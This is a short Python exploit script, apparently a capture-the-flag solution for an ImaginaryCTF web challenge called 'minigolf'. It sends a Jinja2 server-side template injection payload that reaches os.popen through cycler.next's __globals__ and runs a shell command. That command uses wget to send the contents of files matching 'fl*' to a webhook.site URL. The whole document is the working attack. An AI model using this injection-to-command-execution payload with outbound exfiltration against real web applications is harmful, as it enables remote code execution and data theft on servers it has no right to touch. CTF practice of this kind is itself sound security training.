import requests

#URL = "http://localhost:8080"
URL = "http://minigolf.chal.imaginaryctf.org"

data = dict()
data["txt"] = "{%set a=request.args%}{%set b=(cycler.next|attr(a.g)).os.popen(a.c)%}"
data['g'] = "__globals__"
data['c'] = f"wget https://webhook.site/a84fff5a-2df4-4fc5-9ec1-4e2a69d2ccf8?flag=`cat fl*`"
requests.get(URL, params=data)
